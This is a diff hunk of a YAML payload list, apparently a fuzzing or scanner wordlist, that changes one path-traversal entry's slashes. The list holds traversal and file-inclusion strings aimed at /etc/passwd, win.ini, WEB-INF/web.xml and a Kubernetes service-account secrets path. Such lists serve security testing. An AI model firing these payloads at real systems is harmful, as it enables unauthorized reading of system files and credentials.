@@ -2,7 +2,7 @@
 payload:
   - '/static/img/../../etc/passwd'
   - '.../.../WINDOWS/win.ini'
-  - '..\..\..\..\usr/lib\libc.so.6'
+  - '../../../../usr/lib/libc.so.6'
   - 'file=/etc/passwd'
   - '/src/../WEB-INF/web.xml'
   - 'file://0000::001/var/run/secrets/kubernetes.io/serviceaccount'
